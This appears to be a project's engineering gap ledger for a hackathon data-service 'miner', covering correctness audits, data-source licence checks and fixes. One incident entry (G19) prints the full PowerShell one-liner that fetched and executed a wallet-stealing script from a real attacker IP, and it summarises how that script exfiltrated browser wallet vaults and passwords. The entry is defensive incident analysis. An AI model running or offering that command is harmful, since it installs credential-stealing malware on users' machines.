# GAPS.md — honesty ledger

## 2026-10-22/23 Season II rules published, audit release — G203–G207

The Miner and Evaluator rubrics are now on hackathon.telegraphprotocol.com/rules (read 2026-10-22 16:47 UTC).
They are recorded in `RULES_SEASON2.md`; the strategy built on them is in `WINNING.md`. G200–G202 are on
branch `claude/correctness-audit-2026-10-21`, not yet merged here.

- **G203 — The organiser's pages disagree. `OPEN, ask the organisers`.** All read 2026-10-22; the table is in
  `RULES_SEASON2.md`.
  - Deadline: /rules says Nov 1 – Dec 20 with final submission **Dec 20 23:59 UTC**; /timeline and the home
    page say 1 Nov – 1 Dec.
  - Prize pool: /rules says $10,000; the home page says $15,000.
  - Track numbers: /rules has 02 Miners and 03 Evaluators; /tracks has 01 and 02.
  - /judging carries an older Apps rubric.
  - We plan to 1 Dec 23:59 UTC and the /rules prizes until the organisers confirm in writing. The message is
    drafted in WINNING.md §8.
- **G206 — Does `updateMiner` restart the 7-day grace period? `OPEN, ask the organisers; time-critical`.** The
  miner docs give a 7-day grace period "after activation": no leaderboard, and a shared 5% of routed
  traffic. `updateMiner` deregisters and re-registers with a new `registrationId`. The docs do not say
  whether that resets the period. If it does, an update in November costs a week of ranked routing.
  WINNING.md §8 gives two options: sign by Oct 24 23:59 UTC, or freeze registration 4829 for the season.
  Registration 4829 activated 2026-10-16 09:59 UTC, so its own grace period ends about 2026-10-23 10:00 UTC.
  Season I evidence (G58, recorded 2026-09-01): a new registration was scored in the next epoch's pass, the
  same day, so the grace period limits routed **traffic share**, not scoring. The risk is a week of reduced
  routed demand, not a week without a score.
- **G204 — Related-party consumption evidence against folder override 2. `OPEN, owner decision`.**
  - The Miner rubric gives 1 consumption point for use by an H2 mission app "including an application
    operated by the Provider's own team".
  - Repeated use (2), ranked routing (2) and accounting (2) do not require independence. "Related-party
    activity may establish functional consumption but does not receive the additional independent-consumer
    points."
  - So up to 7 of 10 points are reachable with our own disclosed app. Override 2 says nothing we control
    counts as a user or as volume.
  - WINNING.md A4 proposes labelling it related-party and never as users or volume. The owner decides
    whether to build it.
- **G205 — No availability record for the 20 reliability points. `OPEN, owner decision`.** The `uptime`
  workflow has been `disabled_manually` since 2026-10-01 at the owner's request. Reliability, availability
  and capacity are 20 of the Miner's 100 points. Resuming a record from Nov 1, and adding a capacity test,
  needs the owner's yes. Not measured: Vercel plan limits under concurrent load.
- **G207 — Timeless web-search questions quote the wrong Wikipedia article. `OPEN, next WEB_SEARCH fix`.** Seen
  on preview `miner-qazd6wyp9`, 2026-10-23:
  - "Who wrote Pride and Prejudice?" quoted *Pride and Prejudice and Zombies (film)*;
  - "What is the capital of Australia?" quoted the ACT article without naming Canberra;
  - the Mona Lisa and telephone questions came out right.

  The cause is not yet traced: the article is picked inside the timeless path added in `deaac8e`. WEB_SEARCH is
  bought by 7 missions, so this is the highest-value open quality item. Evidence:
  `track1-miner/docs/evidence/release-2026-10-23/`.

  **UPDATE 2026-10-24: `FIXED, DEPLOYED 2026-10-24`** (production `miner-e2999tb2p` from `8d121e9`; the preview
  `miner-qofu599bo` quoted the right article for all three questions above; `docs/evidence/release-2026-10-24/`).
  - **Traced.** The defect is in `qa.ts`'s quoting fallback, which serves both WEB_SEARCH and
    QUESTION_ANSWERING. When there is no model answer, the answer is the sentence sharing the most words with
    the question, and a tie goes to Wikipedia's first hit. That hit is often a film, a band or "Capital
    punishment in Canada".
  - **Where it shows.** The preview had no Groq key: `GROQ_API_KEY` is set for Production only (`vercel env
    ls`, 2026-10-24). Production also falls back. In one run of the 20 questions it served the Four Seasons
    band, the *Boiling Point* film and *A Walk on the Moon*. Not established: whether that run's load on the
    shared key caused the fallback.
  - **Fix.** Sentence ranking only; the sources searched and sent to the model are unchanged, except that
    disambiguation pages are dropped:
    - the title's fit is a quarter-point tie-break;
    - a sentence defining a film or band costs 1.5 when the question is about neither;
    - words are matched on rough stems (painted and painting);
    - an equal score goes to the shorter sentence;
    - extracts are cut at a sentence end.

    An earlier attempt also changed the sources (re-sorting, and searching a lone name). It broke the model
    path for the Moon question, so it was reverted.
  - **Measured on 20 questions.** No model: 11 correct, 1 partial, 8 wrong before; 18 correct, 2 partial,
    0 wrong after. Model: the branch 20/20, production 17/20 in the same minutes. Unit tests 791/791.
    Evidence: `track1-miner/docs/evidence/g207-2026-10-24/`.
  - **Still open:** these are 20 hand-picked questions, not routed traffic, and the 154-question audit has
    not been re-run.

## 2026-10-21 correctness audit — G200–G202

Audit of all 36 intents, 154 questions (routed and realistic) against production `miner-q5qepqluk`, each
compared with its primary source: `track1-miner/docs/evidence/correctness-audit-2026-10-21/`. Production:
**110 pass, 17 partial, 27 fail**. 22 of the 27 fails are fixed on branch `claude/correctness-audit-2026-10-21`
(17 code commits from `220463a` to `a0b2847`, unit 771 → 787), plus one partial (storm precipitation
label); Cape Town's was already fixed by the undeployed places table. **None deployed.**

- **G200 — Fails and partials NOT fixed. `OPEN`.** Recommendation for each: fix, not drop — every one is a
  retrieval or reading defect, and each intent passed its in-scope questions otherwise.
  - RESEARCH_QUERY, 3 of 4 fail: the subject collapses to one entity and drops the qualifier, so
    "Nivolumab … bladder cancer" got a head-and-neck trial, "Pakistan sanction Iran" a root-canal trial in
    Iran, and "creatine and cognition" a beetroot-juice review. Needs: require trials and papers to name the
    qualifier (condition, outcome) as well as the entity, and decline a policy question. Highest-value open item
    (99 routed questions).
  - ACADEMIC_SEARCH: a title lookup ("Attention Is All You Need") returns five unrelated papers though
    OpenAlex's own search ranks it first (78,168 citations); "do academic search for X" keeps "do search"
    in the topic; the federated-learning question gets defence papers for an attacks question.
    **UPDATE 2026-10-24, DEPLOYED 2026-10-24** (production `miner-e2999tb2p`).
    - **Title lookup fixed.** A quotation tied to "paper", "titled" and the like is searched alone. An
      exact-title match is served first. With no exact match, the answer says so at confidence 0.4.
    - **"do academic search for X" fixed.**
    - **Live OpenAlex check:** both audit fails are now right, and three regression questions are unchanged.
      Evidence: `track1-miner/docs/evidence/g200-academic-2026-10-24/`.
    - **Still open:** the federated-learning attacks-vs-defences question.
    - **New data caveat:** OpenAlex records *Attention Is All You Need* as published in 2025, not 2017. We
      pass its year through unchanged.
  - FINANCIAL_DATA: "Will Pfizer's ZAVZPRET sales exceed forecasts?" answers Pfizer's total revenue. A
    product-level or forecast question should be declined by name.
  - Partials: SSL for an unresolvable name leads with openssl how-to rather than "does not resolve"; URL_SAFE
    calls an NXDOMAIN host "not listed" without saying it does not resolve; WEATHER_CHECK "Will Riyadh reach
    40°C today?" gives the range but never says no; NEWS_HEADLINES reads "Storage" as a region;
    FRAUD_DETECTION calls an empty address "elevated risk" for having no history; TEXT_CLASSIFICATION
    refuses a topic classification with no labels; SENTIMENT answers a virality question as sentiment;
    RESEARCH_SYNTHESIS quotes background sentences as findings; CONTENT_EXTRACTION's multi-kind summary repeats
    values and misses "1,200 units"; FACT_CHECK quotes an unrelated article for a forecast ("Violence begets
    violence"). FACT_CHECK's Great Wall myth is now `unverified`, not `contradicted`.
- **G201 — Production's OFAC aliases were missing. `FIXED, DEPLOYED 2026-10-23` (production `miner-n9d4aoxw8`; the preview matched "Rosneft").** "Rosneft" answered
  `no_match` although `ROSNEFT` is an alias of SDN entry 17022; locally, with alt.csv, it scores 1.0. So the
  production instance had parsed SDN.CSV without ALT.CSV (the alias download failed silently) and cached
  that as complete — every alias-only name was cleared. `220463a` makes a failed alias download an unread
  list. **Until deployed, production SANCTIONS name screens can clear aliased parties.** Not measured: how
  long production had served the alias-less list. Likely cause, inferred: the 9 s `SANCTIONS_TIMEOUT_MS`
  against downloads measured at 8.0 s (SDN.CSV, 5.7 MB) and 4.3 s (ALT.CSV) from this machine; in the branch
  replay the OFAC read failed once and the UN read failed twice. With the fix that is an honest "not
  cleared", but a longer timeout or a background refresh would make it rarer.
- **G202 — Deploy notes for the audit branch. `DEPLOYED 2026-10-23`; (2) the ip-api and ipinfo terms are still unread.** (1) `/ip-geolocate` now answers anycast addresses as
  anycast, so `no-regression.mjs` will show 8.8.8.8 differing from production by design, and
  `intent-answers.mjs` now requires `verdict: anycast` for 8.8.8.8 (passes on the branch, fails on current
  production). (2) The anycast flag comes from ipinfo, whose terms are still unread (G189), as are ip-api's;
  ip-api's free endpoint is believed non-commercial — **from memory, not read**: its legal page did not load
  from this machine on 2026-10-21. (3) Web search now calls the `/answer` path for timeless questions; with no
  Groq key it falls back to a quoted sentence, as `/answer` does.

## 2026-10-21 places table and Nominatim policy — G196 update, G198–G199

- **G196 UPDATE — built-in places table. `FIXED in code, NOT deployed`.** `src/places.ts` answers large
  cities from `src/places-data.ts`, generated from Wikidata (CC0) by `tools/build-places.mjs`, before
  any Nominatim request. A bare name is served only when the entry has ≥5× the population of every
  homonym Wikidata knows more than 50 km away ("Valencia" is not; "Valencia, Spain" is); a qualifier
  must match the entry's country, subdivision or a short form ("Miami, FL", "London, UK"); the pre-pass
  stops at the first short candidate it cannot name that is qualified or name-shaped, so "Paris, Texas"
  and "Strait of Malacca" still go to Nominatim. **Measured offline 2026-10-21** on the 99 routed
  weather/storm questions in `tools/routed-questions.json` (fetch stubbed): **80 resolve from the table
  with no Nominatim request**; the rest are Darwin, Cebu and Okinawa (not in the table), "Miami, FL" (the
  comma candidate defers), countries and non-weather questions. Table: 1,706 cities, 1,584 answerable by
  bare name. **Not measured:** whether any table answer differs from what Nominatim would have chosen
  (checking that in bulk is what the policy forbids, G199). The homonym check sees only exact English
  labels, so an accented homonym ("San José" vs "San Jose") is not compared. Wikidata's per-type
  queries time out with a label tail; the generator queries ids first, then details.
- **G198 — Nominatim's policy requires visible attribution; our answers gave none. `FIXED in code, NOT
  deployed`.** Read 2026-10-20 at operations.osmfoundation.org/policies/nominatim: "Clearly display
  attribution as suitable for your medium", data under ODbL. The weather, forecast and storm answers now
  end "; place from © OpenStreetMap contributors (ODbL)" when Nominatim named or located the place;
  table answers carry none. The clause sits at the tail of the prose, after the MET credit.
- **G199 — Two more Nominatim policy clauses. `PARTLY FIXED`.** (1) Apps must be able to switch service
  "at our request at any time ... without requiring a software update": `NOMINATIM_URL` now overrides
  the host (environment change + redeploy, same code). (2) "Systematic queries", including "searching
  for complete lists of ... towns", are forbidden: the places table was therefore never verified against
  Nominatim in bulk. (3) The policy also says the public API "must not be built into ... or
  automatically generated by ... vibe-coding platforms as a generic geocoding ... service" and is
  permitted where "the application developer has made a deliberate, informed decision to use it". The
  miner uses it as an incidental step of a weather answer, not as a geocoding service, and its code is
  AI-assisted. **Owner judgment** whether that reading holds, or whether to move to a paid geocoder.

## 2026-10-18 licence swaps — G189 partly closed, G194–G197

- **G189 UPDATE 2026-10-18 — weather and translation moved to licensed sources; news and stocks NOT.**
  Weather, storm and geocoding: Open-Meteo and BigDataCloud → MET Norway (NLOD 2.0 / CC BY 4.0, read
  api.met.no/doc/License and /TermsOfService 2026-10-18) and Nominatim (ODbL) in `e86a0f4`. Translation:
  `clients5.google.com` (unofficial) and MyMemory (no resale) → Groq in `329254b`. **Still on non-commercial
  sources:** Google News RSS (`/web-search`, `/news-search`, `/headlines`) and Yahoo (`/stock-price`, the
  listed-company half of `/financial`), plus URLhaus ("may require" a subscription). Owner decision below.
- **G194 — GDELT is not a usable news source. `CLOSED as a finding`.** Recommended on 2026-10-17; tested
  2026-10-18 ~08:05 UTC: the first and second requests from this machine both came back HTTP 429 after ~12 s,
  "Please limit requests to one every 5 seconds … All high-traffic users should switch to our ngrams
  dataset". Vercel's shared egress would be worse. News stays on Google News RSS until the owner picks a
  licensed source: Brave Search API (account and key), a paid news API, or Wikipedia's Current Events portal
  (CC BY-SA, daily headlines only, no topic search).
- **G195 — What MET Norway does not publish, and what that costs. `OPEN, accepted`.** Measured 2026-10-18 for
  London and Chennai: no precipitation probability and no wind gusts outside the Nordic countries, hourly
  steps for ~65 h then 6-hourly to ~9 days. So `precipitation_probability_max_pct` and `max_wind_gust_kmh` are
  null outside the Nordics (the answers say so), the storm grade uses sustained wind on the Beaufort bands,
  and forecasts past ~9 days are cut short and say so. **The registered manifest still claims more**:
  `days` "1 to 16", the example "Will gusts exceed 60 km/h in Miami tonight?", and both fields as returned.
  Fix those strings in the next `updateMiner`.
- **G196 — Nominatim's one request per second is per instance. `OPEN`, and observed.** weather-upstream.ts
  caches lookups for a day and spaces requests a second apart, but serverless instances do not share that
  spacing. **Seen 2026-10-18 ~08:12 UTC:** the live suite's parallel test processes exceeded the policy from
  one address and Nominatim answered HTTP 429 to this machine. Since `1d1969e` an unreachable geocoder is
  reported as an outage, not "No resolvable location"; live tests now run one file at a time. Concurrent
  production demand can do the same from Vercel's addresses. **Recommended fix:** a built-in table of the
  most-asked places from Wikidata (CC0), so common cities need no Nominatim call at all; else a shared cache
  (KV) or a paid geocoder.
- **G197 — Groq for translation sits near its no-resale clause. `OPEN, owner judgment`.** The Services
  Agreement (console.groq.com/docs/legal/services-agreement, read 2026-10-18) allows integrating the models
  into a "Customer Application" and forbids reselling "the Cloud Services" (§6.3(c)). A translation endpoint
  is a thin layer over the model. QUESTION_ANSWERING already relies on the same reading. Free-tier quotas
  (30 RPM / 1K RPD per model, three models, shared with sentiment, classification and answers) cap volume;
  past them translation reports an outage. Live 2026-10-18: 20 of 21 routed questions translated
  (`track1-miner/docs/evidence/release-2026-10-18/translation-live.txt`).

## 2026-10-13/14 Season II build — G186 closed, G188 deployed, G189–G193

- **G186 — DeFiLlama's terms forbid serving its TVL for pay. `CLOSED 2026-10-14, code 93d8531, NOT deployed`.**
  defillama.com/terms (read 2026-10-14 ~04:50 UTC): a licence "to access and use the Site for personal,
  non-commercial purposes", and a ban on exploiting "the Content & Data for commercial purposes without
  prior written consent". `/tvl` now refuses protocol and chain scopes with `error: not_licensed` and calls
  no DeFiLlama URL; token pool liquidity (GeckoTerminal, DexScreener) is still answered. **Decided
  2026-10-14:** TVL_LOOKUP is dropped (`2e8d1cf`). The owner said "if you find any intent to be not
  beneficial, you can remove it". The same commit drops TELEGRAPH_KNOWLEDGE, AI_TEXT_DETECTION,
  TEXT_AUTHENTICITY_CHECK, CONTENT_VERIFICATION, GAME_RESULT and SPORTS_SCORE.
- **G188 — deployed.** Release `0498678` promoted 2026-10-13 ~18:40 UTC as `miner-q67fqthj7`; production
  answers the Berlin claim `contradicted`. The "picks the article about the claim" live test failed 2/3 on
  Wikipedia ranking drift; fixed by reading 20 candidates (`120f11b`), 3/3 after.
- **G189 UPDATE 2026-10-14 ~06:30 UTC — terms read; four sources confirmed non-commercial. `OPEN, owner decision`.**
  Read from each source's own page that day:
  - **Open-Meteo:** "You may only use the free API services for non-commercial purposes"
    (open-meteo.com/en/terms). It serves `/weather-forecast` (WEATHER_FORECAST and WEATHER_CHECK) and
    `/storm-alert`, our highest-demand intents, plus geocoding.
  - **Google News RSS:** every feed says it is "made available solely for the purpose of rendering
    Google News results within a personal feed reader for personal, non-commercial use. Any other use
    of the feed is expressly prohibited." It serves `/web-search` (7 missions), `/news-search` and
    `/headlines`.
  - **Yahoo:** its terms bar automated access and "any commercial purpose". It serves `/stock-price` and
    the listed-company half of `/financial`.
  - **BigDataCloud reverse geocoder:** "client-side only"; `storm.ts` calls it from the server.
  - **MyMemory:** forbids reselling its service "as they are". `/translate` also calls
    `clients5.google.com`, an unofficial Google Translate endpoint.
  - **abuse.ch (URLhaus):** commercial users "may require a paid subscription". It serves `/url-scan`,
    `/url-reputation` and `/fraud-check`.

  **Fine for commercial use, as read:** DexScreener ("both non-commercial and commercial"), ipwho.is
  ("Commercial use allowed", 1,000/day), Nominatim (ODbL, attribution, light use), Frankfurter.
  **Licensed alternatives checked:**
  - MET Norway: NLOD 2.0 / CC BY 4.0, identify via User-Agent. Its forecast had no wind gusts at
    Chennai, so storm quality would drop.
  - GDELT: "unlimited and unrestricted use for any academic, commercial, or governmental use", one
    request per 5 s.

  **Still unread:** CoinGecko (403 to a script), GeckoTerminal, ipinfo, Datamuse, Coinbase, Kraken, ESPN
  (removed with the sports intents), Groq's free tier.
- **G189 — other data sources' commercial-use terms are unread. `superseded by the update above`.**
  The G186 problem may repeat. Not checked: Yahoo Finance (stock prices, `/stock-price`, `/financial`),
  CoinGecko (`/crypto-price`, `/financial`), GeckoTerminal and DexScreener (`/tvl` token pools), Kraken and
  Coinbase public tickers, ip-api, Open-Meteo, URLhaus (abuse.ch), Blockscout and Routescan, Polymarket and
  Manifold, MyMemory/Google translate. Public-sector sources added this pass (OFAC, UN, SEC, GLEIF CC0,
  BLS, NY Fed, Eurostat, ECB, World Bank CC BY 4.0) and Wikipedia (CC BY-SA, cited by title and URL) are
  believed reusable with attribution; that too is from memory and unverified. Read each terms page.
- **G190 — Blockscout's Ethereum counters undercount during a reindex. `MITIGATED in ffd1cc6`.** Uniswap V2
  router read 101, then 155, against Routescan's 90,500,102 (2026-10-13); UNI fell from 3.88M to 496K.
  A Blockscout count under half of Routescan's is replaced by Routescan's and attributed. Not covered:
  chains other than Ethereum (no Routescan failover there).
- **G191 — SANCTIONS: two lists, not four. `OPEN, by design`.** OFAC SDN (via the SLS API) and the UN list are
  screened. The EU (18.6 MB) and UK (16.6 MB) lists are too large to read per request and are named as not
  screened in every answer. Thresholds (match ≥ 0.95, possible ≥ 0.90) were set on six real names, not a
  labelled set; a missing list makes a no-match `unknown`, never a clearance.
- **G192 — MACRO depends on series keys that move.** Eurostat's `prc_hicp_manr` and the ECB's ICP series
  stopped at 2025-12 (ECOICOP 2 change); `/macro` reads `prc_hicp_minr`. Euro-area unemployment needs geo
  `EA21` (Bulgaria, 2026). BLS v1 is keyless with a small daily quota per IP; answers are cached 3 h.
- **G193 — QUESTION_ANSWERING retrieval is Wikipedia-only.** Recent events missing from Wikipedia intros get
  "The sources do not say" or an extracted sentence. Model replies are kept only when every sentence cites a
  real source (validator `citedEverywhere`), so the failure mode is a refusal, not an uncited claim.

## 2026-10-11 fact-check co-occurrence fix — G188

Evidence: `track1-miner/docs/evidence/factcheck-g188-2026-10-11/live-sweep.txt`. Code: `a9867c3`.

- **G188 — FACT_CHECK settled one- and two-term claims by co-occurrence. `FIXED in a9867c3, NOT deployed`.**
  Observed on production 2026-10-11 ~05:32 UTC: `/fact-check?query=The Eiffel Tower is in Berlin.` →
  `supported` 0.7, quoting "During World War I, the Eiffel Tower's wireless station played a crucial role
  in intercepting enemy communications from Berlin." `settle()` left one key (`berlin`) after the
  subject; need = ceil(1 × 2/3) = 1. The same sentence made "…is not in Berlin" `contradicted`.
  Fix (`src/factrelation.ts`): a claim with ≤2 keys counts a key only in a clause that states something
  of the subject — subject-headed and not possessive, a copula over a stand-in like "no species", or a
  which/who/that clause in a sentence the subject opens — whose verb is present tense when the claim's
  is. A place counts only after in/at/on/within/inside, with no for/from/by/as/… between verb and place.
  When nothing states the claim, a lead sentence (first three) that puts the subject in a same-kind rival
  place (a short continent/country/city list) and never names the claimed place contradicts it.
  `sentencesOf` no longer splits inside parentheses ("lit." in the Taj Mahal lead). `supported` still
  comes only from the subject's own article.
  Unit: 783/783 on the combined tree at `a9867c3` (771 + 12 new; 9 of the 12 fail on pre-fix code), run
  11:15 UTC in a worktree replica of it. Live Wikipedia, 20 claims, pre-fix → fixed: Eiffel/Berlin,
  Colosseum/Athens, Statue of Liberty/Paris `supported`→`contradicted`; Big Ben/Paris, Taj Mahal/Pakistan
  `unverified`→`contradicted`; Golden Gate Bridge/San Francisco and Mount Everest/Asia
  `supported`→`unverified` (true claims, but the old evidence did not state them); 13 unchanged. A local
  server at the fix answered the production query `contradicted`, citing the lead.
  **Limits:** a place not on the list is never contradicted, only unverified; containment ("in Europe")
  stays unverified by design; a place that belongs to another noun with no preposition between ("a tower
  that stands in Berlin") can still support; "Sydney Opera House is in Sydney" has no keys (pre-existing).
  **Pre-existing, not this fix:** the live test "picks the article about the claim…" fails at `63bc659`
  too — Wikipedia now ranks `Human_brain` for "humans only use 10% of their brains".

## 2026-10-11 improvement pass — G186–G187

Evidence: `track1-miner/docs/evidence/improve-2026-10-11/` (`PLAN.md`, `rank-audit.json`), deleted 2026-10-22
and kept in git history (`git log --diff-filter=D -- track1-miner/docs/evidence/improve-2026-10-11`).

- **G186 — DeFiLlama's terms may forbid serving its TVL figures for pay. `CLOSED 2026-10-14 (verified; see the top block)`.**
  Source: the TVL leader `finwire-tvl`'s own live answer (2026-10-10 19:14 UTC) quotes DeFiLlama's terms
  as "personal, non-commercial purposes" with a clause forbidding republishing "in any form without
  permission". It now refuses every TVL question for that reason. Our `/tvl` serves DefiLlama figures.
  **Not checked against DeFiLlama's own terms page.** Read the terms before deciding whether `/tvl`
  should keep serving these figures.
- **G187 — Most remaining ratio gaps come from the scorer, not from wrong answers. `OPEN, finding`.** Epoch 400:
  CRYPTO_PRICE's champion (reg 3170, keccak-verified locally) gives 1.0 only to an identical figure, and
  41/56 miners score 0. A refusal (`finwire-tvl`) outscores a correct TVL figure 8×. A canned beacon root
  (`xchain-beacon-publicnode`) outscores a real cross-chain answer. TELEGRAPH_KNOWLEDGE's and
  WEATHER_FORECAST's 1.0 scorers are operator-hosted (`127.0.0.1:8099` manifests). None of these is a
  fix that keeps answers truthful. The replay of routed questions is the only proven lever.

## Still open from Season I

Season I entries that still describe the miner or a live risk. Every other Season I entry was closed
or moot once Season I was judged, and was cut on 2026-10-17: `git log -p -- GAPS.md`.

### G19 · The miner wallet's seed phrase is compromised — `OPEN, accepted risk`
2026-08-28. The operator was social-engineered in a hackathon Discord DM by an account named
`ADMINS {NEVER DM FIRST}` — the name copies the label real servers use to warn that admins never
DM first — and ran:

```
iwr -useb http://170.205.30.207/usertroubleshoot.ps1 | iex
```

The script was retrieved as text and analysed (never re-executed). It is a narrow wallet stealer:
it walks every Chrome profile, copies the `Local Extension Settings` vault for MetaMask, Phantom
and Rabby, prompts for the wallet password and writes it in plaintext, zips both, POSTs to
`http://170.205.30.207:3000/upload`, then deletes the staging folder. The staging folder was
already gone when checked, so the upload path completed.

**Scope, verified on the machine:**
- **Five Chrome profiles** hold MetaMask vaults (`Default`, `Profile 1`, `Profile 9`, `Profile 10`,
  `Profile 12`). Vault + password = seed phrase. Treat every seed in those profiles as lost, and
  the encrypted vaults as brute-forceable even where no password was typed.
- **No persistence.** No scheduled task, Run key or startup entry was created; all present entries
  are legitimate. It runs once and exits.
- **It does not read** the GitHub token, Vercel token, SSH keys, `.env` files, saved browser
  passwords or cookies. Those were **not** rotated, deliberately — rotating them would have been
  an hour of work against a threat that does not exist here.
- Chrome only. Edge, Brave and Firefox were untouched.

**Caveat:** `iex` executed whatever that host served at that moment; the analysis is of what it
served afterwards. Observed behaviour matched (password prompts, folder created then removed) and
the absence of persistence corroborates it, but this is not a byte-identical guarantee.

**Why this is a project risk, not just a wallet risk.** `0xdAd2…A39E` owns registration **260**.
Whoever holds that seed can call `deregisterMiner(260)` for the price of gas and delete the Track 1
entry — four rank-1 positions and six intents. On-chain state checked the same day: nonce 3, which
matches only our own registrations, and 0.0 native balance on Ethereum, Base and Arbitrum mainnet.
**Nothing has been touched.**

**Accepted rather than mitigated, deliberately.** Re-registering from a clean wallet three days
before the close would mean a new registration id, a fresh rejection risk, and losing the running
score history — for protection against an attacker who gains nothing by acting. Drainers are
automated and profit-motivated; deleting a testnet miner earns them nothing.

**What a fresh session should know:**
- `.github/workflows/uptime.yml` polls registration 260 every 15 minutes and opens an issue if
  `activation_status` changes. That alerting is now load-bearing. **If the miner is ever found
  deregistered, this is the likely cause — re-register from a clean wallet, do not assume a
  protocol fault.**
- Do not use those seeds for anything after the hackathon.
- The same Discord contact also pushed a fake "Vercel dapps mainnet wallet validation" flow. There
  is no such thing. No legitimate Telegraph step needs a PowerShell script or a seed phrase.

---

### G16 · The protocol node is a single point of failure for us — `OPEN`
`devnode.telegraphprotocol.com` was fully unreachable for at least three consecutive 20s probes on
2026-08-26 while our own miner served normally. Everything we depend on for *observability* —
activation status, catalog, intents, scores — runs through that one host, and so does the
registration console.

Implications we cannot engineer away:
- A node outage during the grace period may cost us scored epochs through no fault of ours.
- `updateMiner` (the pending IP_GEOLOCATION addition) cannot be executed while it is down.
- Our uptime workflow polls `activation_status` through the same host, so a node outage will look
  like a miner problem in our own alerting. Worth distinguishing in `tools/watch.mjs` if it recurs.

### G65 · The public repo `Harshyadav442277/Telegraph` is a copy of PREFLIGHT, a rival miner — `OPEN, operator decision`
Found 2026-09-02 while checking repo names: its README and package.json are `preflight-ssl-verification`
(source public at github.com/shreshth006/Preflight), last pushed 2026-08-28. Judges browse profiles;
a competitor's code under our name with no attribution reads badly. Delete it, make it private, or add
an attributed study-fork note. Nothing in either of our repos depends on it.
Re-checked 2026-09-03: still public, last pushed 2026-08-28. Still the operator's call.

### G81 · OpenAlex is shedding anonymous search, so ACADEMIC_SEARCH answers "no papers" on cache-cold questions; one retry shipped, the real remedy is the operator's — `OPEN 2026-09-08`

Found through the tripwire. After G80 was fixed, a dispatched `uptime` run and two full preflights
each failed exactly one probe: `verify-deploy`'s bare-topic `/papers` check, "0 papers in prose" in
233–389 ms. Probing OpenAlex directly from this machine: **HTTP 429 on five of seven requests four
seconds apart**, body "Anonymous search is temporarily rate-limited while the search cluster is under
elevated load. Please retry in 35s, or use a free API key", one 200 in the middle, and 429 again after
the advertised 35 s. Production answered five papers on five spaced probes only because the
60-second cache was warm from the first; a cache-cold topic during the shedding gets the honest
"No peer-reviewed papers on … were found", which scores ~0 and, for a real caller, is a worse answer
than the truth. This is G43's second failure mode, now observed hitting the live route rather than a
sweep, and the alarm on issue #10 is reporting it correctly — an upstream outage is ours (organizer
answer, 2026-08-30).

**Shipped:** `get()` in `papers.ts` now retries the SAME query once after min(Retry-After, 2.5 s)
when OpenAlex answers 429 or 503, inside the request's own budget, so the primary timeout is not
shortened to fund it; unit-tested with a mocked 429-then-200. Measured value: it catches the bursty
window (one 200 in seven) sometimes, not reliably.

**Not shipped, because it is the operator's decision (G43):** OpenAlex lifts the limit for requests
carrying a contact address (`mailto=`, the "polite pool") or a free API key. The code now sends
either **only if `OPENALEX_MAILTO` or `OPENALEX_API_KEY` is set** in the Vercel environment; nothing
is sent otherwise, and no address was chosen here. One `vercel env add OPENALEX_MAILTO production
--scope wukong4` plus a redeploy closes this. Until then `/papers` degrades honestly during
OpenAlex's load-shedding, and `uptime`'s `check` job will keep failing on that probe whenever the
shedding coincides with a run — an honest red, not a false one.

**Addendum, 09:01Z the same morning:** the next dispatched `uptime` run passed the papers probe (the
retry, 5.7 s) and failed a different fixture instead — `self-signed.badssl.com` reported
`unreachable` in 25 ms from GitHub and timed out at 8.3 s from this machine — while badssl.com
answered every host normally minutes later and production classified the same host `self_signed`.
That is the transient badssl blip the workflow's own comment and G21 already describe, not a defect,
and it is the reason a single red run is never believed without a re-run. The same run also tripped
`verify-deploy`'s hard 5 s p95 budget: the papers retry's 2.5 s wait made a shed-window answer take
5.7 s. Latency is scored, so the wait is now 1.5 s (0.3 s refusal + 1.5 s + a ~3 s answer stays
inside the budget); it buys a shorter retry window in exchange, and that trade is deliberate.

### **G139 — SENTIMENT sarcastic-opening praise reads negative.** Narrow rule: an opening
interjection followed by purely negative text. Other sarcasm and irony are still missed. Our
score for this intent has been 0 every epoch 329–333 and no real case is known, so a rank
effect is not expected from this alone.

### **G161 — The method NAME comes from openchain.xyz / 4byte.directory, not the contract ABI.**
Keyless, 2.5 s budget inside an 8.5 s allowance from the start of the lookup; oldest entry wins a
collision; when neither answers, the selector is written ("called contract method selector
0x540abf73"). A mined collision both databases rank wrongly would print a wrong name. Measured
end-to-end on the two hidden hashes: 2.5 s and 1.1 s. Not measured: every RPC slow AND both
databases slow at once.
